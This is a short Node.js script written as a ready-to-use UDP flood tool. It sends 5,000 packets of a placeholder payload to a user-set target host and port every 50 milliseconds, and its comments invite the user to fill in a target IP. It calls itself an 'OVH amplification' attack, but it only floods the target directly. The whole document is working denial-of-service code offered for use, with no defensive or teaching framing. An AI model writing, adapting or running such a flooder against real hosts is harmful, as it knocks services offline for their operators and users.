const dgram = require('dgram');
const target = 'example.com'; // Replace with target IP
const port = 80; // Replace with target port
const amplificationPayload = Buffer.from('OVH Amplification Example Payload'); // Custom payload
const maxConnections = 5000; // Max simultaneous packets

const client = dgram.createSocket('udp4');

function ovhAmplification() {
    for (let i = 0; i < maxConnections; i++) {
        client.send(amplificationPayload, 0, amplificationPayload.length, port, target, (err) => {
            if (err) {
                console.error(`Error sending packet: ${err.message}`);
            } else {
                console.log(`[Packet ${i}] Sent amplified packet to ${target}:${port}`);
            }
        });
    }
}

setInterval(ovhAmplification, 50); // Send amplification every 50ms